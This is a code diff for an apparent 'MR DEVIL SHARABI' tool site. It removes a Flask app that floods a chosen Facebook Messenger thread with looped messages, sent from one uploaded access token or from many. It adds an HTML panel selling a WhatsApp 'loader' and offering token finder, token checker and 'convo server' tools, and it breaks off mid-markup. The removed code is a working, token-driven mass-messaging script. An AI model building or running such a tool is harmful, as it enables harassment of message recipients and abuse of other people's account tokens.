@@ -1,490 +1,643 @@
-from flask import Flask, request, render_template_string, session
-import requests
-from threading import Thread, Event
-import time
-import random
-import string
-from datetime import datetime
-from collections import defaultdict
-
-app = Flask(__name__)
-app.secret_key = 'supersecretkey'
-app.debug = True
-
-headers = {
-    'Connection': 'keep-alive',
-    'Cache-Control': 'max-age=0',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64)...',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'referer': 'www.google.com'
-}
-
-stop_events = {}
-threads = {}
-thread_task_map = {}
-
-user_counter = 0  # All-time unique users
-daily_user_counter = defaultdict(set)  # date string -> set of session ids or IPs
-
-def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
-    stop_event = stop_events[task_id]
-    while not stop_event.is_set():
-        for message1 in messages:
-            if stop_event.is_set():
-                break
-            for access_token in access_tokens:
-                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                message = str(mn) + ' ' + message1
-                parameters = {'access_token': access_token, 'message': message}
-                response = requests.post(api_url, data=parameters, headers=headers)
-                if response.status_code == 200:
-                    print(f"Message Sent Successfully From token {access_token}: {message}")
-                else:
-                    print(f"Message Failed From token {access_token}: {message}")
-                time.sleep(time_interval)
-
-@app.route('/', methods=['GET', 'POST'])
-def send_message():
-    global user_counter
-
-    today_str = datetime.now().strftime('%Y-%m-%d')
-    # Use session sid if available, else fallback to IP
-    user_id = session.get('sid', None) or request.remote_addr
-
-    # All-time unique user counting
-    if not session.get('visited'):
-        user_counter += 1
-        session['visited'] = True
-
-    # Daily unique user counting
-    if not session.get('visited_today') or session.get('visited_today') != today_str:
-        session['visited_today'] = today_str
-        daily_user_counter[today_str].add(user_id)
-
-    if request.method == 'POST':
-        token_option = request.form.get('tokenOption')
-        if token_option == 'single':
-            access_tokens = [request.form.get('singleToken')]
-        else:
-            token_file = request.files['tokenFile']
-            access_tokens = token_file.read().decode().strip().splitlines()
-
-        thread_id = request.form.get('threadId')
-        mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
-
-        txt_file = request.files['txtFile']
-        messages = txt_file.read().decode().splitlines()
-
-        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
-
-        stop_events[task_id] = Event()
-        thread_task_map[thread_id] = task_id
-        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
-        threads[task_id] = thread
-        thread.start()
-
-        return f'Task started for Inbox UID: {thread_id}'
-
-    return render_template_string('''
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>DEVIL SHARABI</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
-  <link href="https://fonts.googleapis.com/css?family=Poppins:400,600,900&display=swap" rel="stylesheet">
-  <style>
-    /* Your CSS styles here (same as before) */
-    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@900&display=swap');
-    html, body {
-      height: 100%;
-      width: 100%;
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      background: linear-gradient(135deg, #0f2027 0%, #2c5364 100%);
-      color: #f8e9a1;
-      font-family: 'Montserrat', 'Poppins', cursive, sans-serif;
-    }
-    body {
-      min-height: 100vh;
-      min-width: 100vw;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      overflow-x: hidden;
-    }
-    .container {
-      width: 100%;
-      max-width: 430px;
-      border-radius: 22px;
-      padding: 32px 20px 24px 20px;
-      background: rgba(20, 30, 50, 0.92);
-      box-shadow: 0 8px 30px rgba(255, 215, 0, 0.3);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      border: 2.5px solid #ffd700;
-      backdrop-filter: blur(10px);
-      margin: 0 auto;
-    }
-    .brand-title {
-      font-family: 'Montserrat', cursive, sans-serif;
-      font-weight: 900;
-      font-size: 2.2rem;
-      background: linear-gradient(90deg, #ffd700 10%, #ff7e5f 80%);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      letter-spacing: 2px;
-      margin-bottom: 18px;
-      text-shadow: 0 0 18px #fff700, 0 0 6px #ff5733;
-      position: relative;
-      display: inline-block;
-      word-break: break-word;
-      line-height: 1.1;
-    }
-    .brand-badge {
-      background: linear-gradient(90deg, #43cea2 0%, #185a9d 100%);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      font-size: 1.1em;
-      font-weight: bold;
-      letter-spacing: 1.5px;
-      padding: 0 12px 0 0;
-      text-shadow: 0 0 6px #43cea2;
-      position: relative;
-      top: -3px;
-    }
-    label.form-label {
-      color: #ffd700;
-      font-weight: 700;
-      font-size: 1.05rem;
-      margin-bottom: 3px;
-      letter-spacing: 1.5px;
-      font-family: 'Montserrat', cursive, sans-serif;
-      text-shadow: 0 0 2px #ffd700;
-      display: block;
-      text-align: left;
-    }
-    .form-section-label {
-      color: #fffbe7;
-      font-size: 1.09rem;
-      font-weight: 800;
-      letter-spacing: 1px;
-      margin: 18px 0 6px 0;
-      text-shadow: 0 0 2px #ffd700;
-      text-align: left;
-      width: 100%;
-      font-family: 'Montserrat', cursive, sans-serif;
-    }
-    .form-control {
-      background: rgba(255,255,255,0.06);
-      border: 2px solid #ffd700;
-      color: #fffbe7;
-      margin-bottom: 13px;
-      border-radius: 13px;
-      padding: 9px 13px;
-      font-size: 1.08rem;
-      font-family: 'Montserrat', cursive, sans-serif;
-      transition: border-color 0.3s ease;
-      width: 100%;
-      box-shadow: 0 0 8px #ffd70033;
-    }
-    .form-control:focus {
-      border-color: #fff700;
-      box-shadow: 0 0 12px #ffd700;
-      outline: none;
-    }
-    .btn-premium {
-      background: linear-gradient(90deg, #ffd700 0%, #ffb700 100%);
-      color: #2c5364;
-      border: none;
-      border-radius: 30px;
-      font-weight: 900;
-      padding: 12px 0;
-      font-size: 1.13rem;
-      width: 100%;
-      margin-bottom: 10px;
-      letter-spacing: 2px;
-      font-family: 'Montserrat', cursive, sans-serif;
-      box-shadow: 0 0 16px #ffd70099;
-      transition: background 0.3s, color 0.3s, transform 0.2s, box-shadow 0.2s;
-      text-shadow: 0 0 6px #fff700;
-      position: relative;
-      overflow: hidden;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 7px;
-    }
-    .btn-premium:hover {
-      background: linear-gradient(90deg, #fff700 0%, #ffd700 100%);
-      color: #000;
-      box-shadow: 0 0 24px #ffd700cc;
-      transform: scale(1.04);
-    }
-    .btn-danger {
-      background: linear-gradient(90deg, #e74c3c 0%, #c0392b 100%);
-      color: #fffbe7;
-      border: none;
-      border-radius: 30px;
-      width: 100%;
-      font-weight: 900;
-      padding: 12px 0;
-      font-size: 1.13rem;
-      letter-spacing: 2px;
-      font-family: 'Montserrat', cursive, sans-serif;
-      text-shadow: 0 0 6px #fff700;
-      margin-bottom: 10px;
-      box-shadow: 0 0 10px #e74c3c99;
-      transition: background 0.3s, transform 0.2s, box-shadow 0.2s;
-      position: relative;
-      overflow: hidden;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 7px;
-    }
-    .btn-danger:hover {
-      background: linear-gradient(90deg, #ff5733 0%, #e74c3c 100%);
-      color: #ffd700;
-      box-shadow: 0 0 18px #e74c3ccc;
-      transform: scale(1.04);
-    }
-    .btn-badge {
-      display: inline-block;
-      margin-left: 8px;
-      background: linear-gradient(90deg, #43cea2 0%, #185a9d 100%);
-      color: #fff;
-      font-size: 0.89em;
-      font-weight: 800;
-      border-radius: 8px;
-      padding: 2px 8px;
-      letter-spacing: 1px;
-      box-shadow: 0 0 6px #43cea2cc;
-      vertical-align: middle;
-      text-shadow: 0 0 2px #185a9d;
-    }
-    .btn-premium i, .btn-danger i, .btn-social i {
-      margin-right: 7px;
-    }
-    .btn-social {
-      background: linear-gradient(90deg, #43cea2 0%, #185a9d 100%);
-      color: #fffbe7 !important;
-      border: none;
-      border-radius: 30px;
-      padding: 10px 18px;
-      font-size: 1.08rem;
-      margin: 0 6px;
-      box-shadow: 0 0 10px #43cea299;
-      text-shadow: 0 0 4px #fff700;
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      font-family: 'Montserrat', cursive, sans-serif;
-      font-weight: 900;
-      letter-spacing: 1px;
-      transition: transform 0.2s, box-shadow 0.2s;
-      position: relative;
-    }
-    .btn-social:hover {
-      color: #ffd700 !important;
-      background: linear-gradient(90deg, #185a9d 0%, #43cea2 100%);
-      box-shadow: 0 0 22px #ffd700cc, 0 0 8px #43cea2cc;
-      transform: scale(1.04);
-    }
-    .social-links {
-      margin-top: 16px;
-      margin-bottom: 0;
-      width: 100%;
-      display: flex;
-      justify-content: center;
-      flex-wrap: wrap;
-      gap: 10px;
-    }
-    .social-label {
-      color: #ffd700;
-      font-size: 1.03rem;
-      font-weight: 700;
-      margin-bottom: 3px;
-      letter-spacing: 1px;
-      text-shadow: 0 0 2px #fff700;
-      font-family: 'Montserrat', cursive, sans-serif;
-      display: block;
-      text-align: center;
-    }
-    footer {
-      margin-top: 20px;
-      font-size: 16px;
-      font-weight: 900;
-      text-shadow: 1px 1px 3px #000;
-      color: #ffd700;
-      letter-spacing: 1px;
-      font-family: 'Montserrat', cursive, sans-serif;
-    }
-    hr {
-      border-color: #ffd700;
-      width: 100%;
-      margin: 18px 0 12px 0;
-    }
-    .counter {
-      margin-top: 14px;
-      color: #fffbe7;
-      font-size: 1.13rem;
-      font-weight: 900;
-      text-shadow: 0 0 5px #ffd700;
-      font-family: 'Montserrat', cursive, sans-serif;
-      letter-spacing: 1px;
-    }
-    @media (max-width: 600px) {
-      body {
-        padding: 0;
-        min-height: 100vh;
-        align-items: flex-start;
-      }
-      .container {
-        max-width: 99vw;
-        padding: 12px 2vw 10px 2vw;
-        border-radius: 10px;
-        box-shadow: 0 4px 10px #ffd70044;
-        margin: 10px auto 0 auto;
-      }
-      .brand-title {
-        font-size: 1.3rem;
-        margin-bottom: 10px;
-        word-break: break-word;
-      }
-      .form-section-label {
-        font-size: 1rem;
-        margin: 10px 0 3px 0;
-      }
-      .form-control,
-      .btn-premium,
-      .btn-danger {
-        font-size: 0.98rem;
-        padding: 7px 0;
-      }
-      .btn-social {
-        font-size: 0.98rem;
-        padding: 7px 10px;
-      }
-      .social-label {
-        font-size: 0.98rem;
-      }
-      .counter {
-        font-size: 1rem;
-      }
-      footer {
-        font-size: 11px;
-      }
-    }
-    @media (max-width: 400px) {
-      .brand-title {
-        font-size: 1rem;
-      }
-      .container {
-        padding: 5px 1vw 4px 1vw;
-      }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="MR DEVIL SHARABI TOOL PANEL - Premium Facebook and WhatsApp automation tools">
+    <meta name="keywords" content="Facebook tools, WhatsApp tools, token generator, MR DEVIL">
+    <title>🦋MR DEVIL SHARABI TOOL PANEL🦋</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #ff007f;
+            --secondary-color: #00fff7;
+            --dark-bg: #121212;
+            --card-bg: #1e1e1e;
+            --text-color: #ffffff;
+            --hover-color: #00ff00;
+            --border-radius: 10px;
+            --box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            --transition: all 0.3s ease;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: var(--dark-bg);
+            color: var(--text-color);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+        nav {
+            background-color: #000;
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: var(--box-shadow);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+        .nav-left, .nav-right { flex: 1; display: flex; }
+        .nav-left { justify-content: flex-start; }
+        .nav-right { justify-content: flex-end; }
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--primary-color);
+            text-shadow: 0 0 10px rgba(255, 0, 127, 0.5);
+            text-align: center;
+            flex: 1;
+            letter-spacing: 2px;
+        }
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0.6rem 1.2rem;
+            border-radius: var(--border-radius);
+            font-weight: 500;
+            text-decoration: none;
+            transition: var(--transition);
+            border: none;
+            cursor: pointer;
+            gap: 0.5rem;
+        }
+        .btn-facebook { background-color: #1877f2; color: white; }
+        .btn-facebook:hover { background-color: #166fe5; transform: translateY(-2px); box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);}
+        .btn-whatsapp { background-color: #25d366; color: white; }
+        .btn-whatsapp:hover { background-color: #1da851; transform: translateY(-2px); box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);}
+        .btn-whatsapp small { font-size: 0.95rem; margin-left: 0.4rem; font-weight: 700; color: yellow; }
+        .menu-icon {
+            display: none;
+            flex-direction: column;
+            cursor: pointer;
+            width: 30px;
+            height: 25px;
+            justify-content: space-between;
+        }
+        .menu-icon span {
+            display: block;
+            width: 100%;
+            height: 3px;
+            background-color: var(--primary-color);
+            transition: var(--transition);
+        }
+        .menu-icon:hover span { background-color: var(--text-color);}
+        .nav-links {
+            display: none;
+            list-style: none;
+            gap: 1rem;
+        }
+        .nav-links a { text-decoration: none; }
+        .container {
+            max-width: 1200px;
+            margin: 2rem auto;
+            padding: 2rem;
+            background-color: var(--card-bg);
+            border-radius: var(--border-radius);
+            box-shadow: 0 0 20px var(--primary-color);
+        }
+        .status-container {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 1.5rem;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+        .status-box {
+            padding: 0.8rem 1.5rem;
+            border-radius: var(--border-radius);
+            background-color: #282828;
+            border: 2px solid var(--primary-color);
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+            transition: var(--transition);
+            flex-grow: 1;
+        }
+        .status-box:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 10px rgba(255, 0, 127, 0.2);
+            border-color: var(--secondary-color);
+        }
+        .status-icon { font-size: 1.2rem; color: var(--secondary-color);}
+        .status-text { font-weight: 500; font-size: 0.95rem;}
+        .status-value { font-weight: 600; color: var(--secondary-color); margin-left: 0.5rem;}
+        h1 {
+            text-align: center;
+            color: var(--primary-color);
+            font-size: 2.5rem;
+            margin-bottom: 2rem;
+            text-shadow: 0 0 10px rgba(255, 0, 127, 0.3);
+            letter-spacing: 2px;
+        }
+        .service-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+            gap: 2rem;
+        }
+        .service-card {
+            padding: 2.2rem 1.5rem 1.5rem 1.5rem;
+            border-radius: var(--border-radius);
+            border: none;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            min-height: 170px;
+            color: #fff;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.15rem;
+            font-weight: bold;
+            letter-spacing: 1px;
+            transition: transform 0.18s, box-shadow 0.18s, background 0.25s;
+            position: relative;
+            overflow: hidden;
+            border: 2px solid white;
+            box-shadow: 0 0 15px rgba(0,255,255,0.7), 0 0 10px rgba(255,0,127,0.7);
+        }
+        .service-card:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px rgba(255,0,127,0.9), 0 0 15px rgba(0,255,255,0.9);
+        }
+        .service-card:nth-child(1) { background: linear-gradient(135deg, #ff007f 0%, #ff00ff 100%);}
+        .service-card:nth-child(2) { background: linear-gradient(135deg, #00bfff 0%, #00ff7f 100%);}
+        .service-card:nth-child(3) { background: linear-gradient(135deg, #ff8c00 0%, #ffd700 100%);}
+        .service-card:nth-child(4) { background: linear-gradient(135deg, #9400d3 0%, #ff69b4 100%);}
+        .service-card:nth-child(5) { background: linear-gradient(135deg, #ff4500 0%, #ffa500 100%);}
+        .service-card:nth-child(6) { background: linear-gradient(135deg, #008080 0%, #00ffff 100%);}
+        .service-card:nth-child(7) { background: linear-gradient(135deg, #8a2be2 0%, #ff00ff 100%);}
+        .service-card:nth-child(8) { background: linear-gradient(135deg, #ff6347 0%, #ffa500 100%);}
+        .service-card:nth-child(9) { background: linear-gradient(135deg, #1e90ff 0%, #00bfff 100%);}
+        .service-card:nth-child(10) { background: linear-gradient(135deg, #ff1493 0%, #ff6347 100%);}
+        .service-card:nth-child(11) { background: linear-gradient(135deg, #9932cc 0%, #ff69b4 100%);}
+        .service-card i {
+            font-size: 2.3rem;
+            margin-bottom: 0.7rem;
+            color: #fff;
+            text-shadow: 0 0 8px var(--secondary-color);
+        }
+        .service-card h2 {
+            color: #fff;
+            font-size: 1.22rem;
+            font-weight: 800;
+            margin: 0.7rem 0 0.6rem 0;
+            letter-spacing: 1px;
+            text-shadow: 0 0 12px #000, 0 0 2px #0ff;
+            word-break: break-word;
+        }
+        .service-card p {
+            color: #ffd;
+            font-size: 1.05rem;
+            font-family: 'Montserrat', sans-serif;
+            font-weight: 400;
+            margin-bottom: 0.2rem;
+        }
+        .download-btn {
+            margin-top: 1.2rem;
+            background: #222;
+            color: #00fff7;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.05rem;
+            font-family: 'Montserrat', sans-serif;
+            font-weight: 600;
+            padding: 0.7rem 1.5rem;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            box-shadow: 0 2px 8px #0005;
+            transition: background 0.2s, color 0.2s, transform 0.15s;
+            text-decoration: none;
+        }
+        .download-btn i { font-size: 1.1rem; color: #00fff7; margin-right: 0.4rem; text-shadow: none;}
+        .download-btn:hover { background: #00fff7; color: #121212; transform: scale(1.06);}
+        .download-btn:hover i { color: #121212;}
+        .payment-info { margin: 8px 0 4px 0; font-size: 0.98rem; }
+        .unlock-btn, .open-btn, .logout-btn {
+            margin: 8px 0; padding: 0.5rem 1.2rem; border-radius: 8px; border: none; font-weight: 600;
+            background: #ff007f; color: #fff; cursor: pointer; transition: 0.2s;
+        }
+        .unlock-btn:hover, .open-btn:hover, .logout-btn:hover { background: #00fff7; color: #121212; }
+        .login-popup input { margin: 2px 0; padding: 6px; border-radius: 5px; border: 1px solid #444; width: 85%; }
+        .login-popup button { margin-top: 4px; }
+        .expired { color: #ff4040; font-weight: bold; }
+        footer {
+            background-color: var(--card-bg);
+            color: var(--primary-color);
+            text-align: center;
+            padding: 2rem;
+            margin-top: 3rem;
+            box-shadow: 0 -4px 8px rgba(0, 0, 0, 0.2);
+        }
+        .footer-content { display: flex; flex-direction: column; gap: 1.5rem;}
+        .social-links { display: flex; justify-content: center; gap: 1.5rem; margin-top: 1rem;}
+        .loading {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border: 2px solid rgba(255, 255, 255, .3);
+            border-radius: 50%;
+            border-top-color: var(--primary-color);
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 0.5rem;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .glowing-arrow {
+            color: YELLOW;
+            text-shadow: 0 0 10px YELLOW;
+            animation: glow 1.5s ease-in-out infinite alternate;
+        }
+        @keyframes glow {
+            from { text-shadow: 0 0 1px YELLOW; }
+            to { text-shadow: 0 0 15px YELLOW; }
+        }
+        @media (max-width: 768px) {
+            .nav-left, .nav-right { display: none; }
+            .menu-icon { display: flex; }
+            .nav-links {
+                position: fixed;
+                top: 70px;
+                left: -100%;
+                background-color: #000;
+                width: 100%;
+                flex-direction: column;
+                align-items: center;
+                padding: 1.5rem;
+                transition: var(--transition);
+            }
+            .nav-links.active { left: 0; display: flex;}
+            .container { padding: 1.5rem;}
+            h1 { font-size: 2rem;}
+            .service-grid { grid-template-columns: 1fr;}
+            .status-container { flex-direction: column; gap: 1rem;}
+            .social-links { flex-direction: column; align-items: center;}
+        }
+        @media (max-width: 480px) {
+            .logo { font-size: 1.5rem;}
+            .btn { padding: 0.5rem 1rem; font-size: 0.9rem;}
+            .status-box { padding: 0.8rem 1rem;}
+        }
+    </style>
 </head>
 <body>
-  <audio id="bgmusic" src="https://cdn.pixabay.com/audio/2022/07/26/audio_124bfae6b8.mp3" autoplay loop></audio>
-  <div class="container text-center">
-    <h2 class="brand-title">
-      <span class="brand-badge">DEVIL</span> SHARABI
-    </h2>
+    <nav>
+        <div class="nav-left">
+            <a href="https://wa.me/919024870456" class="btn btn-whatsapp">
+                <i class="fab fa-whatsapp"></i> 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 <small>(9024870456)</small>
+            </a>
+        </div>
+        <div class="logo">🦋𝗠𝗥 𝗗𝗘𝗩𝗜𝗟 𝗦𝗛𝗔𝗥𝗔𝗕𝗜🦋</div>
+        <div class="nav-right">
+            <a href="https://www.facebook.com/share/1AkRQ3QdVb/" class="btn btn-facebook">
+                <i class="fab fa-facebook"></i> 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞
+            </a>
+        </div>
+        <div class="menu-icon" onclick="toggleMenu()">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+        <ul class="nav-links" id="nav-menu">
+            <li>
+                <a href="https://wa.me/919024870456" class="btn btn-whatsapp">
+                    <i class="fab fa-whatsapp"></i> 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 <small>(9024870456)</small>
+                </a>
+            </li>
+            <li>
+                <a href="https://www.facebook.com/share/1AkRQ3QdVb/" class="btn btn-facebook">
+                    <i class="fab fa-facebook"></i> 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞
+                </a>
+            </li>
+        </ul>
+    </nav>
+    <div class="container">
+        <div class="status-container">
+            <div class="status-box ping-box">
+                <i class="fas fa-signal status-icon"></i>
+                <span class="status-text" style="color: var(--primary-color);">𝗣𝗜𝗡𝗚 ⁑</span>
+                <span class="status-value" id="pingValue"><span class="loading"></span>Calculating...</span>
+            </div>
+            <div class="status-box time-box">
+                <i class="fas fa-clock status-icon"></i>
+                <span class="status-text" style="color: var(--primary-color);">𝗧𝗜𝗠𝗘 ⁑</span>
+                <span class="status-value" id="timeValue"><span class="loading"></span>Loading...</span>
+            </div>
+            <div class="status-box date-box">
+                <i class="fas fa-calendar-day status-icon"></i>
+                <span class="status-text" style="color: var(--primary-color);">𝗗𝗔𝗧𝗘 ⁑</span>
+                <span class="status-value" id="dateValue"><span class="loading"></span>Loading...</span>
+            </div>
+        </div>
+        <h1 class="glowing-arrow">🦋𝗠𝗥 𝗗𝗘𝗩𝗜𝗟 𝗧𝗢𝗢𝗟𝗦 𝗣𝗔𝗡𝗘𝗟🦋</h1>
+        <div class="service-grid">
 
-    <form method="post" enctype="multipart/form-data" style="width:100%;">
-      <div class="form-section-label">Send Message</div>
-      <label class="form-label">Token Option</label>
-      <select class="form-control" name="tokenOption" onchange="toggleTokenInput()" required>
-        <option value="single">Single Token</option>
-        <option value="multiple">Token File</option>
-      </select>
-      <div id="singleTokenInput">
-        <input type="text" class="form-control" name="singleToken" placeholder="Enter Token">
-      </div>
-      <div id="tokenFileInput" style="display:none;">
-        <input type="file" class="form-control" name="tokenFile">
-      </div>
-      <label class="form-label">Inbox UID</label>
-      <input type="text" class="form-control" name="threadId" placeholder="Enter Inbox UID" required>
-      <label class="form-label">Sender Name</label>
-      <input type="text" class="form-control" name="kidx" placeholder="Enter Sender Name" required>
-      <label class="form-label">Time Interval (seconds)</label>
-      <input type="number" class="form-control" name="time" placeholder="Time Interval (seconds)" required>
-      <label class="form-label">Message File (.txt)</label>
-      <input type="file" class="form-control" name="txtFile" required>
-      <button type="submit" class="btn btn-premium mt-2">
-        <i class="fas fa-paper-plane"></i> Start Messaging <span class="btn-badge">DEVIL</span>
-      </button>
-    </form>
+            <!-- (1) WP Loader (Paid) -->
+            <div class="service-card paid-tool" id="wp-card" style="background: linear-gradient(135deg, #ff007f 0%, #ff00ff 100%); cursor:auto;">
+                <i class="fab fa-whatsapp"></i>
+                <h2>(1) 🦋MR DEVIL WP LOADER <span style="color:yellow;">[PAID]</span>🦋</h2>
+                <p>WhatsApp Loader Tool for fast automation.</p>
+                <div class="payment-info">
+                    <b>Price: ₹200/month</b><br>
+                    Pay via <b>PhonePe/UPI:</b> <span style="color:yellow;">8824391563@ibl</span>
+                </div>
+                <button class="unlock-btn" onclick="showLogin('wp')">Unlock</button>
+                <div id="wp-login" class="login-popup" style="display:none;">
+                    <input type="text" placeholder="Username" id="wp-username"><br>
+                    <input type="password" placeholder="Password" id="wp-password"><br>
+                    <button onclick="loginTool('wp',30)">Login</button>
+                </div>
+                <div id="wp-user-info" style="display:none;">
+                    <span>Welcome, <span id="wp-name"></span></span><br>
+                    <span>First Login: <span id="wp-first-login"></span></span><br>
+                    <span id="wp-timer"></span><br>
+                    <button class="open-btn" onclick="window.open('https://your-wp-loader-link.com','_blank')">Open Tool</button>
+                    <button class="logout-btn" onclick="logoutTool('wp')">Logout</button>
+                </div>
+            </div>
 
-    <hr>
-
-    <form method="post" action="/stop" style="width:100%;">
-      <div class="form-section-label">Stop Messaging</div>
-      <label class="form-label">Inbox UID to Stop</label>
-      <input type="text" class="form-control" name="threadId" placeholder="Enter Inbox UID to Stop" required>
-      <button type="submit" class="btn btn-danger mt-2">
-        <i class="fas fa-ban"></i> Stop Messaging <span class="btn-badge">DEVIL</span>
-      </button>
-    </form>
-
-    <div class="social-label">Connect With Us</div>
-    <div class="social-links">
-      <a href="https://wa.me/9024870456" class="btn btn-social">
-        <i class="fab fa-whatsapp"></i> WhatsApp <span class="btn-badge">DEVIL</span>
-      </a>
-      <a href="https://www.facebook.com/share/195iPt5waG/MR DEVIL" class="btn btn-social">
-        <i class="fab fa-facebook-f"></i> Facebook <span class="btn-badge">DEVIL</span>
-      </a>
+            <!-- (2) GP UID Finder (Free) -->
+            <div class="service-card" style="background: linear-gradient(135deg, #00bfff 0%, #00ff7f 100%);" onclick="window.open('https://your-gp-uid-finder-link.com','_blank')">
+                <i class="fa-solid fa-users"></i>
+                <h2>(2) 🦋𝗠𝗥 𝗗𝗘𝗩𝗜𝗟 𝗚𝗣 𝗨𝗜𝗗 𝗙𝗜𝗡𝗗𝗘𝗥🦋</h2>
+                <p>Find group UIDs instantly using this tool.</p>
+            </div>
+            <!-- (3) Token Checker (Free) -->
+            <div class="service-card" style="background: linear-gradient(135deg, #ff8c00 0%, #ffd700 100%);" onclick="window.open('https://your-token-checker-link.com','_blank')">
+                <i class="fa-solid fa-check"></i>
+                <h2>(3) 🦋𝗠𝗥 𝗗𝗘𝗩𝗜𝗟 𝗧𝗢𝗞𝗘𝗡 𝗖𝗛𝗘𝗖𝗞𝗘𝗥🦋</h2>
+                <p>Check if your token is live or dead.</p>
+            </div>
+            <!-- (4) Convo Server (Free) -->
+            <div class="service-card" style="background: linear-gradient(135deg, #9400d3 0%, #ff69b4 100%);" onclick="window.open('https://your-convo-server-link.com','_blank')">
+                <i class="fab fa-facebook-messenger"></i>
+                <h2>(4) 🦋𝗠𝗥 𝗗𝗘𝗩𝗜𝗟 𝗖𝗢𝗡𝗩𝗢 𝗦𝗘𝗥𝗩𝗘𝗥🦋</h2>
+                <p>Send messages using Facebook token.</p>
+            </div>
+            <!-- (5) Token Finder (Free) -->
+            <div class="service-card" style="background: linear-gradient(135deg, #ff4500 0%, #ffa500 100%);" onclick="window.open('https://your-token-finder-link.com','_blank')">
+                <i class="fa-solid fa-key"></i>
+                <h2>(5) 🦋 𝗠𝗥 𝗗𝗘𝗩𝗜𝗟 𝗧𝗢𝗞𝗞𝗘𝗡 𝗙𝗜𝗡𝗗𝗘𝗥🦋</h2>
+                <p>Find tokens easily with this tool.</p>
+            </div>
+            <!-- (6) Page Token Generator (Free) -->
+            <div class="service-card" style="background: linear-gradient(135deg, #008080 0%, #00ffff 100%);" onclick="window.open('https://your-page-token-gen-link.com','_blank')">
+                <i class="fa-solid fa-file-export"></i>
+                <h2>(6) 🦋𝗠𝗥 𝗗𝗘𝗩𝗜𝗟 𝗣𝗔𝗚𝗘 𝗧𝗢𝗞𝗘𝗡 𝗚𝗘𝗡𝗥𝗔𝗧𝗢𝗥🦋</h2>
+                <p>Generate page tokens for your Facebook pages.</p>
+            </div>
+            <!-- (7) Encode Tool (Free) -->
+            <div class="service-card" style="background: linear-gradient(135deg, #8a2be2 0%, #ff00ff 100%);" onclick="window.open('https://your-encode-tool-link.com','_blank')">
+                <i class="fa-solid fa-lock"></i>
+                <h2>(7) 🦋𝗠𝗥 𝗗𝗘𝗩𝗜𝗟 𝗘𝗡𝗖𝗢𝗗𝗘 𝗧𝗢𝗢𝗟🦋</h2>
+                <p>Encode your data securely and fast.</p>
+            </div>
+            <!-- (8) Pair Code Generator (Free) -->
+            <div class="service-card" style="background: linear-gradient(135deg, #ff6347 0%, #ffa500 100%);" onclick="window.open('https://your-paircode-gen-link.com','_blank')">
+                <i class="fa-solid fa-qrcode"></i>
